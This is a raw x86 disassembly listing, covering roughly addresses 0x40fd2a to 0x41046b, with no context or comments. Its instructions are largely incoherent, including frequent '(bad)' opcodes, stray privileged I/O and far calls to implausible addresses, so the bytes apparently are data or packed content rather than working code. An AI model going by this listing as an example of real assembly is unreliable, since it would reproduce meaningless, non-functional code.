  40fd2a:	jle    0x40fce4
  40fd2c:	pop    ss
  40fd2d:	neg    BYTE PTR [edx]
  40fd2f:	pop    edx
  40fd30:	js     0x40fd39
  40fd32:	outs   dx,BYTE PTR ds:[esi]
  40fd33:	nop
  40fd34:	shl    DWORD PTR [ecx-0x1afd6052],cl
  40fd3a:	pop    edx
  40fd3b:	pop    ebp
  40fd3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd3d:	cmp    esi,DWORD PTR [ecx-0x372af8ec]
  40fd43:	mov    dh,0x5c
  40fd45:	pop    edx
  40fd46:	outs   dx,DWORD PTR ds:[esi]
  40fd47:	retf   0xf821
  40fd4a:	fnstsw WORD PTR [ebx-0x79]
  40fd4d:	cmp    eax,0x5f4396c
  40fd52:	xor    eax,0x88a775ed
  40fd57:	xchg   edi,eax
  40fd58:	sbb    al,0x83
  40fd5a:	adc    bh,BYTE PTR ds:0x225ca7f5
  40fd60:	in     eax,dx
  40fd61:	popf   
  40fd62:	hlt    
  40fd63:	cmp    BYTE PTR [edi],cl
  40fd65:	repz dec eax
  40fd67:	js     0x40fdc7
  40fd69:	sub    eax,0xe0f67b2a
  40fd6e:	and    esp,DWORD PTR [eax-0x32]
  40fd71:	and    al,0x3c
  40fd73:	scas   eax,DWORD PTR es:[edi]
  40fd74:	std    
  40fd75:	ins    DWORD PTR es:[edi],dx
  40fd76:	add    al,0x39
  40fd78:	mov    dh,0xf3
  40fd7a:	sub    BYTE PTR [edx],dl
  40fd7c:	mov    ss,ebx
  40fd7e:	out    0xac,eax
  40fd80:	cmc    
  40fd81:	jne    0x40fdcf
  40fd83:	jae    0x40fd9c
  40fd85:	mov    al,dh
  40fd87:	outs   dx,DWORD PTR ds:[esi]
  40fd88:	test   eax,0x70351d3b
  40fd8d:	xor    edi,DWORD PTR [eax-0x5fc0da3e]
  40fd93:	jmp    FWORD PTR [eax+edi*1+0x55]
  40fd97:	mov    ds:0x9abf9e1e,al
  40fd9c:	outs   dx,BYTE PTR ds:[esi]
  40fd9d:	cmp    BYTE PTR [esi],al
  40fd9f:	cmp    BYTE PTR [edi],0xc4
  40fda2:	ins    BYTE PTR es:[edi],dx
  40fda3:	or     al,0x22
  40fda5:	ret    0x116e
  40fda8:	int3   
  40fda9:	scas   al,BYTE PTR es:[edi]
  40fdaa:	fiadd  DWORD PTR [eax]
  40fdac:	(bad)  
  40fdad:	data16 je 0x40fde8
  40fdb0:	repnz adc al,0x8d
  40fdb3:	inc    ebx
  40fdb4:	icebp  
  40fdb5:	mov    ch,0xf5
  40fdb7:	adc    al,BYTE PTR [esi+0x36]
  40fdba:	sbb    DWORD PTR [edi-0x46],0xffffffc0
  40fdbe:	cs jae 0x40fdbe
  40fdc1:	test   BYTE PTR [ecx],cl
  40fdc3:	mov    ch,0xca
  40fdc5:	xor    al,bh
  40fdc7:	xor    DWORD PTR [ebx-0x34a76dd3],0xf5d0c631
  40fdd1:	or     ecx,edi
  40fdd3:	cli    
  40fdd4:	fisttp WORD PTR [ecx+0x3b9215bb]
  40fdda:	mov    DWORD PTR [esi+0x5e],esi
  40fddd:	sub    esp,DWORD PTR [edi+ecx*2+0x1e]
  40fde1:	cmp    bl,dl
  40fde3:	add    bl,ah
  40fde5:	jns    0x40fde3
  40fde7:	into   
  40fde8:	fdivp  st(3),st
  40fdea:	inc    BYTE PTR [ebx]
  40fdec:	xor    eax,0x8efa3505
  40fdf1:	adc    ch,BYTE PTR [esi+0x76]
  40fdf4:	ja     0x40fe13
  40fdf6:	out    0x4f,eax
  40fdf8:	int3   
  40fdf9:	or     eax,0x15ca6471
  40fdfe:	and    al,0x39
  40fe00:	and    ebp,ebx
  40fe02:	int    0xf9
  40fe04:	push   ds
  40fe05:	cmp    bl,dh
  40fe07:	daa    
  40fe08:	scas   al,BYTE PTR es:[edi]
  40fe09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe0a:	ror    BYTE PTR ss:[ebx-0x26],cl
  40fe0e:	lea    edx,[ebp-0x41112db2]
  40fe14:	das    
  40fe15:	push   eax
  40fe16:	mov    dl,0x8b
  40fe18:	pop    ebx
  40fe19:	cmp    BYTE PTR [esi],al
  40fe1b:	sub    eax,DWORD PTR [ecx-0x766752f6]
  40fe21:	inc    edx
  40fe22:	outs   dx,DWORD PTR ds:[esi]
  40fe23:	sahf   
  40fe24:	rcl    BYTE PTR [ebp-0x82ca036],1
  40fe2a:	(bad)  
  40fe2b:	cmp    BYTE PTR [esi+0x70],bh
  40fe2e:	fimul  WORD PTR [eax-0x7d7ae7d9]
  40fe34:	cmc    
  40fe35:	lods   al,BYTE PTR ds:[esi]
  40fe36:	ret    
  40fe37:	cmp    esi,eax
  40fe39:	xor    ecx,DWORD PTR [ebx-0x79]
  40fe3c:	pop    edi
  40fe3d:	cmp    edx,DWORD PTR [edi+0x3a]
  40fe40:	rol    cl,cl
  40fe42:	fiadd  WORD PTR [eax]
  40fe44:	sbb    esp,DWORD PTR [edx+eax*8]
  40fe47:	fcomip st,st(5)
  40fe49:	jo     0x40fe83
  40fe4b:	inc    edi
  40fe4c:	in     eax,0xd8
  40fe4e:	push   esp
  40fe4f:	add    al,BYTE PTR [esp+eax*1]
  40fe52:	cli    
  40fe53:	jp     0x40fe84
  40fe55:	neg    BYTE PTR [eax]
  40fe57:	jle    0x40fe25
  40fe59:	sbb    BYTE PTR [edi+0x1cf1ecb8],0xb0
  40fe60:	cmc    
  40fe61:	sbb    ebp,ebp
  40fe63:	call   0x44f29502
  40fe68:	jge    0x40fe9b
  40fe6a:	xchg   edi,eax
  40fe6b:	cmc    
  40fe6c:	adc    DWORD PTR [ebp+eiz*8-0x18],ecx
  40fe70:	adc    ebp,esp
  40fe72:	js     0x40fe1a
  40fe74:	js     0x40feb7
  40fe76:	outs   dx,DWORD PTR ds:[esi]
  40fe77:	or     bl,BYTE PTR [ecx+0x19ccaa9a]
  40fe7d:	inc    ebp
  40fe7e:	mov    dh,0x38
  40fe80:	mov    ch,0x41
  40fe82:	les    edi,FWORD PTR [edi+0x5d]
  40fe85:	cmp    eax,0xaaf59399
  40fe8a:	mov    dh,0xf8
  40fe8c:	pusha  
  40fe8d:	cli    
  40fe8e:	xchg   esi,eax
  40fe8f:	mov    ebp,0x33dd83fe
  40fe94:	mov    ebx,DWORD PTR [edx]
  40fe96:	push   cs
  40fe97:	adc    BYTE PTR [ecx+edx*1],0x1c
  40fe9b:	leave  
  40fe9c:	mov    al,0x7f
  40fe9e:	call   0xd72f3de
  40fea3:	adc    eax,0xf01426d5
  40fea8:	xor    al,BYTE PTR [edi]
  40feaa:	out    0x36,al
  40feac:	adc    bh,BYTE PTR [eax+0x7f]
  40feaf:	in     eax,dx
  40feb0:	call   0xf5925b4b
  40feb5:	add    DWORD PTR [ecx+0x1e12d433],eax
  40febb:	ins    DWORD PTR es:[edi],dx
  40febc:	mov    DWORD PTR [ebx+esi*1],edi
  40febf:	out    0x9f,eax
  40fec1:	(bad)  
  40fec3:	lds    ecx,FWORD PTR [ebp+0x11104ffe]
  40fec9:	mov    dl,0x5
  40fecb:	mov    ebx,0x170e4ef5
  40fed0:	inc    edi
  40fed1:	and    ah,cl
  40fed3:	cmp    ah,BYTE PTR [ebp+edi*1-0x1]
  40fed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fed8:	jb     0x40ff50
  40feda:	push   esi
  40fedb:	cld    
  40fedc:	xchg   esp,eax
  40fedd:	sbb    edx,ebp
  40fedf:	outs   dx,BYTE PTR ds:[esi]
  40fee0:	test   DWORD PTR [ecx],edi
  40fee2:	push   0xa23ba9d
  40fee7:	pop    edx
  40fee8:	xchg   ecx,eax
  40fee9:	sar    DWORD PTR [esi],cl
  40feeb:	push   edx
  40feec:	in     eax,dx
  40feed:	xor    ebx,edi
  40feef:	cmp    al,0xa0
  40fef1:	add    al,0x84
  40fef3:	dec    eax
  40fef4:	repnz inc edx
  40fef6:	fidiv  DWORD PTR [edx]
  40fef8:	cmc    
  40fef9:	enter  0x629d,0xd6
  40fefd:	out    dx,eax
  40fefe:	mov    ch,0x9b
  40ff00:	bound  edi,QWORD PTR [ecx+0x78f93949]
  40ff06:	iret   
  40ff07:	dec    edx
  40ff08:	or     DWORD PTR [esi],ebx
  40ff0a:	adc    esi,DWORD PTR [ebx+0x7d]
  40ff0d:	into   
  40ff0e:	outs   dx,BYTE PTR ds:[esi]
  40ff0f:	sahf   
  40ff10:	nop
  40ff11:	pusha  
  40ff12:	ret    0x36a4
  40ff15:	xor    eax,0x6f8438fd
  40ff1a:	jl     0x40ff1a
  40ff1c:	pushf  
  40ff1d:	aam    0x19
  40ff1f:	push   es
  40ff20:	cmc    
  40ff21:	inc    ecx
  40ff22:	gs mov ah,0xaa
  40ff25:	dec    esi
  40ff26:	mov    ebx,0x173ba88a
  40ff2b:	shl    ebp,0x6a
  40ff2e:	jae    0x40ff97
  40ff30:	cld    
  40ff31:	mov    eax,0xd635686e
  40ff36:	xor    eax,0xb12a1ac2
  40ff3b:	cmp    BYTE PTR [eax+0x47],ch
  40ff3e:	and    ah,ah
  40ff40:	mov    es,esi
  40ff42:	(bad)  
  40ff43:	retf   
  40ff44:	cmc    
  40ff45:	shl    BYTE PTR [edx-0x676335e8],cl
  40ff4b:	dec    esi
  40ff4c:	test   al,bh
  40ff4e:	mov    ecx,0x565275ba
  40ff53:	rcr    DWORD PTR [ebx+edi*4],0xbb
  40ff57:	mov    esp,0xd14a2ff5
  40ff5c:	mov    eax,0xebaa9c10
  40ff61:	cmp    al,cl
  40ff63:	sub    BYTE PTR [edx],bh
  40ff65:	lahf   
  40ff66:	repz loop 0x40ff85
  40ff69:	cmp    eax,0xe9f5bce4
  40ff6e:	add    edi,ebp
  40ff70:	push   ebx
  40ff71:	jne    0x40ffe4
  40ff73:	inc    eax
  40ff74:	and    edi,0x67760cc2
  40ff7a:	mov    ch,0x4a
  40ff7c:	fcomp  st(3)
  40ff7e:	repz fs popa 
  40ff81:	sahf   
  40ff82:	outs   dx,BYTE PTR ds:[esi]
  40ff83:	(bad)  
  40ff84:	retf   
  40ff85:	(bad)  
  40ff86:	xchg   edx,eax
  40ff87:	dec    BYTE PTR [ecx]
  40ff89:	adc    al,BYTE PTR [edx]
  40ff8b:	adc    ebx,DWORD PTR ds:[ebx]
  40ff8e:	icebp  
  40ff8f:	push   cs
  40ff90:	in     al,0x6b
  40ff92:	cli    
  40ff93:	js     0x40ff74
  40ff95:	in     al,dx
  40ff96:	test   ah,ah
  40ff98:	push   ds
  40ff99:	shr    DWORD PTR [ecx-0x52],0x2c
  40ff9d:	in     al,dx
  40ff9e:	sbb    al,0x91
  40ffa0:	cli    
  40ffa1:	dec    ecx
  40ffa2:	sub    eax,0x9c8e36d0
  40ffa7:	dec    eax
  40ffa8:	loope  0x41001a
  40ffaa:	sbb    eax,DWORD PTR [ebp+edi*1+0x6e]
  40ffae:	scas   al,BYTE PTR es:[edi]
  40ffaf:	(bad)  
  40ffb0:	cmc    
  40ffb1:	cwde   
  40ffb2:	xchg   esi,eax
  40ffb3:	enter  0xef89,0x32
  40ffb7:	fisub  DWORD PTR [esi+0x38]
  40ffba:	add    al,0x25
  40ffbc:	rol    ecx,cl
  40ffbe:	test   eax,0x6f24fab8
  40ffc3:	mov    BYTE PTR [edx-0x6c],dh
  40ffc6:	adc    eax,0x3ce77a0d
  40ffcb:	cmp    DWORD PTR [eax-0x6e],eax
  40ffce:	nop
  40ffcf:	xor    dh,bh
  40ffd1:	pop    ebx
  40ffd2:	lds    ebx,FWORD PTR [ebp-0x14]
  40ffd5:	in     al,0x2
  40ffd7:	pop    es
  40ffd8:	push   edx
  40ffd9:	jmp    0x40fff9
  40ffdb:	daa    
  40ffdc:	leave  
  40ffdd:	add    ch,BYTE PTR [ebx]
  40ffdf:	cmp    DWORD PTR [ebp+0x48],ebp
  40ffe2:	cmp    ebp,DWORD PTR [ebx+eax*4+0x21]
  40ffe6:	dec    ecx
  40ffe7:	mov    bl,0x79
  40ffe9:	inc    esp
  40ffea:	outs   dx,DWORD PTR ds:[esi]
  40ffeb:	inc    esi
  40ffec:	sbb    edi,DWORD PTR [edx]
  40ffee:	mov    ds,WORD PTR [eax+0x74]
  40fff1:	div    DWORD PTR [eax+0x38]
  40fff4:	sub    al,0xd0
  40fff6:	xor    eax,0xcaceeb7e
  40fffb:	mov    edi,0x390d093e
  410000:	xor    eax,0x98bb730b
  410005:	loop   0x40ffc0
  410007:	cmp    cl,dh
  410009:	sbb    eax,0x289f235f
  41000e:	sbb    eax,0x99f014fe
  410013:	pop    esi
  410014:	cmc    
  410015:	pop    ecx
  410016:	shl    DWORD PTR [esi-0x16],1
  410019:	cdq    
  41001a:	fld    st(3)
  41001c:	in     eax,dx
  41001d:	fild   WORD PTR [edi]
  41001f:	or     esp,DWORD PTR [edx]
  410021:	js     0x410040
  410023:	jno    0x40fffe
  410025:	(bad)  [esi+0x33]
  410028:	pop    esi
  410029:	shl    DWORD PTR [edi+eiz*8],0xc2
  41002d:	ins    DWORD PTR es:[edi],dx
  41002e:	mov    dh,0x38
  410030:	inc    eax
  410031:	or     DWORD PTR [ecx-0x4b054b5e],esi
  410037:	xor    ch,dh
  410039:	call   FWORD PTR [edi-0x11072604]
  41003f:	jae    0x4100b8
  410041:	cmp    ebx,DWORD PTR [eax+0x5be1bf11]
  410047:	jbe    0x41008e
  410049:	je     0x4100ae
  41004b:	xchg   edi,eax
  41004c:	cmc    
  41004d:	xchg   esi,eax
  41004e:	pop    ds
  41004f:	inc    esp
  410050:	jecxz  0x410063
  410052:	push   ebp
  410053:	mov    edi,0x9000386f
  410058:	data16 xor ch,bh
  41005b:	mov    eax,0x5166f1f1
  410060:	cmc    
  410061:	pop    es
  410062:	sbb    BYTE PTR [eax-0x1f],0x76
  410066:	shr    DWORD PTR [ebp-0x3a],0xa1
  41006a:	push   edx
  41006b:	cmp    DWORD PTR [edi+eiz*8+0x2efb84cc],edx
  410072:	jo     0x41007d
  410074:	cmc    
  410075:	jecxz  0x410024
  410077:	xchg   ebx,eax
  410078:	mov    dh,BYTE PTR [ecx+ecx*8+0x75]
  41007c:	sahf   
  41007d:	cmp    esi,edi
  41007f:	dec    esp
  410080:	jo     0x410002
  410082:	mov    esi,0x758b7fd0
  410087:	mov    ecx,0xee66072f
  41008c:	xor    eax,0xc75c679e
  410091:	cmp    eax,DWORD PTR [eax+0x41147b64]
  410097:	call   DWORD PTR ds:0x7cf16ef7
  41009d:	cdq    
  41009e:	pop    ebp
  41009f:	inc    ebp
  4100a0:	mov    eax,ecx
  4100a2:	push   esp
  4100a3:	jmp    0x410087
  4100a5:	js     0x410051
  4100a7:	aaa    
  4100a8:	and    BYTE PTR [edx+0x49f65fe3],0xee
  4100af:	pop    ebp
  4100b0:	or     esp,esi
  4100b2:	lea    esp,[edx-0x5f]
  4100b5:	mov    ah,0xd
  4100b7:	xor    BYTE PTR [ebp-0x6f9f6ffd],ah
  4100bd:	sub    esi,DWORD PTR [esi-0x5f]
  4100c0:	daa    
  4100c1:	or     DWORD PTR [esi-0x32],ebp
  4100c4:	jo     0x410124
  4100c6:	pushf  
  4100c7:	and    al,BYTE PTR [eax]
  4100c9:	lahf   
  4100ca:	lds    esi,FWORD PTR [ebx]
  4100cc:	pop    ebx
  4100cd:	sub    DWORD PTR [esp+ecx*8],esi
  4100d0:	sbb    al,0x38
  4100d2:	dec    ebp
  4100d3:	sub    DWORD PTR [esi],edx
  4100d5:	inc    ecx
  4100d6:	outs   dx,DWORD PTR ds:[esi]
  4100d7:	dec    ebp
  4100d8:	std    
  4100d9:	mov    esp,0x54de062f
  4100de:	or     esi,DWORD PTR [esi]
  4100e0:	addr16 push 0xffffffa2
  4100e3:	std    
  4100e4:	cmc    
  4100e5:	lock sbb esp,edx
  4100e8:	stos   BYTE PTR es:[edi],al
  4100e9:	pop    esp
  4100ea:	scas   al,BYTE PTR es:[edi]
  4100eb:	les    esp,FWORD PTR [esi-0x2d15fcc5]
  4100f1:	mov    al,0x7
  4100f3:	and    BYTE PTR [ecx],0x38
  4100f6:	outs   dx,DWORD PTR ds:[esi]
  4100f7:	push   cs
  4100f8:	push   ss
  4100f9:	cli    
  4100fa:	xor    cl,dl
  4100fc:	imul   ebx,esi,0xb8184b6e
  410102:	inc    edi
  410103:	mov    al,0xe8
  410105:	mov    ch,0xcf
  410107:	cmp    BYTE PTR [esi],dh
  410109:	sbb    ah,BYTE PTR [edi]
  41010b:	scas   eax,DWORD PTR es:[edi]
  41010c:	hlt    
  41010d:	loopne 0x4100d9
  41010f:	push   ebx
  410110:	mov    ebp,0x2f266f44
  410115:	int    0x11
  410117:	ror    DWORD PTR [ecx],0x7c
  41011a:	out    dx,al
  41011b:	dec    esp
  41011c:	jle    0x410105
  41011e:	(bad)  
  41011f:	jns    0x410196
  410121:	xchg   esi,eax
  410122:	mov    eax,ds:0x8e0e4c33
  410127:	mov    eax,0x1cfb47f5
  41012c:	jo     0x410162
  41012e:	rcl    DWORD PTR [esi],cl
  410130:	mov    bl,0x3b
  410132:	and    eax,0xc7785137
  410137:	cmp    DWORD PTR [ebp-0x1740ad5d],edx
  41013d:	test   BYTE PTR [esi+0x402dd4ab],dh
  410143:	test   eax,0x38e19f17
  410148:	jne    0x41010d
  41014a:	lods   al,BYTE PTR ds:[esi]
  41014b:	not    BYTE PTR [edi+ebx*2]
  41014e:	push   ecx
  41014f:	gs cmc 
  410151:	aam    0x20
  410153:	hlt    
  410154:	es inc ebx
  410156:	in     eax,dx
  410157:	jg     0x41010f
  410159:	cmp    al,0xfa
  41015b:	into   
  41015c:	stc    
  41015d:	jbe    0x4101a9
  41015f:	lods   al,BYTE PTR ds:[esi]
  410160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410161:	fsubr  QWORD PTR [eax+0x2782f515]
  410167:	mov    ?,WORD PTR [eax+0xf]
  41016a:	push   es
  41016b:	aaa    
  41016c:	adc    al,0x38
  41016e:	pop    ecx
  41016f:	sub    ch,BYTE PTR [ebp+0xafb3786]
  410175:	mov    eax,ds:0xcb09146e
  41017a:	cmp    al,0x2b
  41017c:	imul   ebp,DWORD PTR [esi],0xc7863934
  410182:	mov    bl,0x2
  410184:	lea    ebp,[eax+0x36]
  410187:	retf   
  410188:	cmc    
  410189:	and    BYTE PTR ds:0xec455366,ah
  41018f:	aad    0xd2
  410191:	out    0x93,al
  410193:	sahf   
  410194:	mov    dl,0x31
  410196:	out    dx,al
  410197:	sbb    dh,BYTE PTR [esi+0x4c]
  41019a:	adc    BYTE PTR [eax-0x8],ah
  41019d:	adc    DWORD PTR [edi+edi*4-0xb],ebp
  4101a1:	rcl    BYTE PTR [edi+0x66],cl
  4101a4:	sub    cl,dh
  4101a6:	(bad)  
  4101a7:	pusha  
  4101a8:	adc    al,0x38
  4101aa:	sar    esi,1
  4101ac:	mov    eax,0x78f1cf79
  4101b1:	push   ebp
  4101b2:	jle    0x410160
  4101b4:	in     al,dx
  4101b5:	ror    dl,cl
  4101b7:	fdiv   DWORD PTR [ecx-0x63e4ac3c]
  4101bd:	xor    al,0xa0
  4101bf:	pop    eax
  4101c0:	test   al,0x31
  4101c2:	outs   dx,BYTE PTR ds:[esi]
  4101c3:	push   edx
  4101c4:	ins    BYTE PTR es:[edi],dx
  4101c5:	out    dx,eax
  4101c6:	xchg   DWORD PTR [eax+0x56aa25e3],ebp
  4101cc:	clc    
  4101cd:	pop    ebx
  4101ce:	call   0xaa25:0x97155bbf
  4101d5:	cmp    ch,cl
  4101d7:	cmp    BYTE PTR [edx-0x4f331889],bh
  4101dd:	sbb    al,0x6e
  4101df:	bnd jmp 0x41016c
  4101e2:	or     bh,dl
  4101e4:	cmp    al,0x69
  4101e6:	add    al,0x2b
  4101e8:	not    BYTE PTR [eax]
  4101ea:	sub    al,dh
  4101ec:	aad    0x60
  4101ee:	mov    eax,0x6f38dff8
  4101f3:	nop
  4101f4:	ss pop esp
  4101f6:	or     al,0xec
  4101f8:	adc    DWORD PTR [ebp+0x1aaa38f8],0x6972edf2
  410202:	xchg   DWORD PTR ds:0x697a57f5,esp
  410208:	adc    BYTE PTR [esi],bh
  41020a:	out    dx,al
  41020b:	push   edx
  41020c:	inc    edx
  41020d:	cmp    dl,ah
  41020f:	pushf  
  410210:	es aas 
  410212:	inc    esi
  410213:	lahf   
  410214:	sub    ebx,0x71
  410217:	out    dx,al
  410218:	mov    ecx,0x80b17856
  41021d:	mov    ebx,0x7f25dd9d
  410222:	or     BYTE PTR [edx],bl
  410224:	clc    
  410225:	imul   esi,DWORD PTR [ecx-0x511d34cd],0xffffffb8
  41022c:	push   ebx
  41022d:	jmp    0x410269
  41022f:	ss cmc 
  410231:	pop    esp
  410232:	pop    eax
  410233:	jle    0x410211
  410235:	aaa    
  410236:	dec    esi
  410237:	scas   al,BYTE PTR es:[edi]
  410238:	jg     0x41026b
  41023a:	repnz cmp eax,0x28ba216e
  410240:	push   ds
  410241:	hlt    
  410242:	hlt    
  410243:	jnp    0x410228
  410245:	sub    ch,BYTE PTR [eax]
  410247:	xchg   ecx,eax
  410248:	pop    ds
  410249:	adc    ebx,DWORD PTR [esi-0x47]
  41024c:	dec    ebp
  41024d:	test   DWORD PTR [ebp-0x20],eax
  410250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410251:	pop    es
  410252:	adc    edx,DWORD PTR [eax]
  410254:	adc    ebx,ecx
  410256:	dec    ebx
  410257:	mov    ecx,0xc9c3ffbb
  41025c:	adc    al,0xf4
  41025e:	imul   edx,DWORD PTR [ebx+ecx*4-0x4],0x5caeec7f
  410266:	mov    edi,0x294a9b58
  41026b:	cmp    DWORD PTR [edi+0x791253f1],ebx
  410271:	mov    al,0x9d
  410273:	(bad)  
  410274:	test   DWORD PTR [edx],0xc985e0cd
  41027a:	or     bl,cl
  41027c:	adc    DWORD PTR [edx],0x7
  41027f:	sbb    edx,DWORD PTR [eax]
  410281:	ins    DWORD PTR es:[edi],dx
  410282:	push   cs
  410283:	add    al,0xe8
  410285:	xor    eax,0xa74962af
  41028a:	out    dx,al
  41028b:	mov    cl,0x5f
  41028d:	icebp  
  41028e:	pop    edx
  41028f:	or     dh,ch
  410291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410292:	or     BYTE PTR [edx],dh
  410294:	stos   BYTE PTR es:[edi],al
  410295:	jnp    0x1e5a6ddd
  41029b:	adc    al,0xb0
  41029d:	jne    0x410259
  41029f:	popf   
  4102a0:	(bad)  [eax]
  4102a2:	dec    esp
  4102a3:	push   ebp
  4102a4:	or     edi,DWORD PTR [eax]
  4102a6:	leave  
  4102a7:	lods   eax,DWORD PTR ds:[esi]
  4102a8:	ja     0x4102cb
  4102aa:	outs   dx,DWORD PTR ds:[esi]
  4102ab:	sub    DWORD PTR [esi+0x5a],esp
  4102ae:	test   DWORD PTR [ebp+0x3],esi
  4102b1:	call   0x5853:0x96112bef
  4102b8:	xor    edi,DWORD PTR [eax+0x6d6882c0]
  4102be:	hlt    
  4102bf:	ret    0xf7f5
  4102c2:	pop    esi
  4102c3:	pop    esi
  4102c4:	aad    0x97
  4102c6:	add    al,0x27
  4102c8:	(bad)  
  4102c9:	push   edi
  4102ca:	and    BYTE PTR [ecx],bh
  4102cc:	rcr    eax,0xb1
  4102cf:	pop    edi
  4102d0:	call   FWORD PTR [edx+0x7cf5e7c6]
  4102d6:	push   cs
  4102d7:	stos   DWORD PTR es:[edi],eax
  4102d8:	mov    dl,0xe1
  4102da:	xor    dl,BYTE PTR [ebx-0x73]
  4102dd:	cmp    edx,DWORD PTR [ebx+ebp*1]
  4102e0:	int3   
  4102e1:	ins    DWORD PTR es:[edi],dx
  4102e2:	fidiv  DWORD PTR [ebp-0x13943ff8]
  4102e8:	xor    ch,BYTE PTR [edx]
  4102ea:	sub    al,0x97
  4102ec:	cmc    
  4102ed:	mov    ebp,0xb99beb43
  4102f2:	sar    BYTE PTR [eax],0xcb
  4102f5:	mov    ebx,0xfc983570
  4102fa:	retf   
  4102fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102fc:	cmc    
  4102fd:	and    BYTE PTR [ecx],0x4e
  410300:	stos   DWORD PTR es:[edi],eax
  410301:	dec    esp
  410302:	mov    ebp,0xe7c38c5b
  410307:	mul    esp
  410309:	push   ebx
  41030a:	xor    BYTE PTR [edx+0x55],cl
  41030d:	cwde   
  41030e:	jne    0x4102e8
  410310:	fldenv [edx]
  410312:	push   0xffffff91
  410314:	cmp    eax,0xfb4b3771
  410319:	push   ebx
  41031a:	and    al,BYTE PTR [eax-0x52]
  41031d:	cmp    edi,ecx
  41031f:	out    0x25,eax
  410321:	cmp    eax,0x44db9e84
  410326:	outs   dx,DWORD PTR ds:[esi]
  410327:	cs dec edx
  410329:	outs   dx,DWORD PTR ds:[esi]
  41032a:	jno    0x410317
  41032c:	xchg   esi,eax
  41032d:	pop    ecx
  41032e:	cmp    dh,BYTE PTR [eax]
  410330:	jbe    0x4102d2
  410332:	ds add eax,0xfb025cbf
  410338:	gs pop ds
  41033a:	inc    eax
  41033b:	shr    ah,0x55
  41033e:	int3   
  41033f:	sub    al,0xb4
  410341:	jo     0x4103a2
  410343:	daa    
  410344:	add    DWORD PTR [edx-0x279cc722],ebx
  41034a:	add    al,0x73
  41034c:	jne    0x410392
  41034e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41034f:	out    0xec,al
  410351:	fldenv [ebp-0x79]
  410354:	(bad)  
  410355:	pop    edx
  410356:	das    
  410357:	imul   ebp,DWORD PTR [edi],0x80393c42
  41035d:	cwde   
  41035e:	adc    bl,BYTE PTR [edi+0x7362af71]
  410364:	imul   dl
  410366:	cmp    DWORD PTR [edi+0x64b753de],0x36
  41036d:	mov    ch,0x21
  41036f:	retf   
  410370:	fld    st(6)
  410372:	aaa    
  410373:	push   ebp
  410374:	test   BYTE PTR [ebx],bh
  410376:	std    
  410377:	dec    ecx
  410378:	outs   dx,BYTE PTR ds:[esi]
  410379:	sub    eax,0xb887a95d
  41037e:	outs   dx,BYTE PTR ds:[esi]
  41037f:	sbb    ecx,esp
  410381:	xor    eax,0xcfa835de
  410386:	lods   al,BYTE PTR ds:[esi]
  410387:	cmp    al,al
  410389:	push   esi
  41038a:	mov    esp,0x9183682b
  41038f:	jmp    0x811c5289
  410394:	pop    esp
  410395:	xor    ch,0x21
  410398:	popf   
  410399:	loop   0x410363
  41039b:	add    al,0x75
  41039d:	dec    eax
  41039e:	jb     0x410365
  4103a0:	loope  0x4103cd
  4103a2:	and    ah,BYTE PTR [ecx]
  4103a4:	cmc    
  4103a5:	ss mov dl,0x17
  4103a8:	(bad)  [eax-0x1fc306dc]
  4103ae:	inc    ebp
  4103af:	out    dx,eax
  4103b0:	idiv   cl
  4103b2:	je     0x410427
  4103b4:	shr    DWORD PTR [esi],cl
  4103b6:	dec    ecx
  4103b7:	leave  
  4103b8:	jo     0x410424
  4103ba:	jp     0x410372
  4103bc:	xchg   esi,eax
  4103bd:	fstp   QWORD PTR [esi]
  4103bf:	in     al,dx
  4103c0:	or     edi,DWORD PTR [eax]
  4103c2:	popf   
  4103c3:	mov    ecx,0xb4afb738
  4103c8:	push   ebx
  4103c9:	popf   
  4103ca:	outs   dx,BYTE PTR ds:[esi]
  4103cb:	out    dx,eax
  4103cc:	fwait
  4103cd:	inc    edi
  4103ce:	sbb    BYTE PTR [ecx],0x3f
  4103d1:	mov    dl,0x14
  4103d3:	cmp    DWORD PTR [esp+ecx*4-0x3cecbb05],esi
  4103da:	xchg   esi,eax
  4103db:	mov    eax,gs
  4103dd:	mov    edx,0x35909485
  4103e2:	in     al,dx
  4103e3:	jno    0x4103be
  4103e5:	xchg   BYTE PTR [esi-0x5b],dl
  4103e8:	cld    
  4103e9:	cmp    edi,DWORD PTR ds:0x776bd722
  4103ef:	(bad)  
  4103f0:	xor    al,0x41
  4103f2:	push   0xfffffffd
  4103f4:	outs   dx,DWORD PTR ds:[esi]
  4103f5:	push   esi
  4103f6:	fs sti 
  4103f8:	fld    DWORD PTR [ebx+0x3bf170b2]
  4103fe:	shr    esp,cl
  410400:	fsubr  st,st(2)
  410402:	pop    edi
  410403:	mov    dl,0x36
  410405:	cmp    ebp,DWORD PTR [esi+0x19]
  410408:	jg     0x410471
  41040a:	popf   
  41040b:	mov    edx,0x3c329fe5
  410410:	pop    edi
  410411:	and    al,0x91
  410413:	dec    edi
  410414:	mul    DWORD PTR [ecx+0x4f6b2557]
  41041a:	push   0x7c
  41041c:	cmp    eax,0xd292e1
  410421:	xchg   edx,eax
  410422:	je     0x41044c
  410424:	xor    al,0xb6
  410426:	lock cmp dh,dl
  410429:	fst    st(7)
  41042b:	or     DWORD PTR [esi-0xa0cf487],edi
  410431:	push   edx
  410432:	push   edx
  410433:	add    esp,esi
  410435:	cwde   
  410436:	repz fidivr DWORD PTR [edi+ebp*1-0x230ec6fe]
  41043e:	push   edx
  41043f:	ficom  DWORD PTR [ecx+0x3b]
  410442:	retf   0xf5ce
  410445:	xchg   ecx,eax
  410446:	inc    esp
  410447:	retf   0x7011
  41044a:	push   eax
  41044b:	fild   DWORD PTR [eax+edi*1+0x63]
  41044f:	sub    eax,DWORD PTR [eax+0x2e]
  410452:	push   esi
  410453:	cmp    al,0xd2
  410455:	test   eax,0x4e91e16e
  41045a:	push   edi
  41045b:	in     al,0xfc
  41045d:	mov    BYTE PTR [ebp+0xd2a8c33],dh
  410463:	push   ebp
  410464:	add    edi,DWORD PTR [eax-0x19]
  410467:	retf   
  410468:	sub    ah,bl
  41046a:	outs   dx,BYTE PTR ds:[esi]
  41046b:	lods   eax,DWORD PTR ds:[esi]
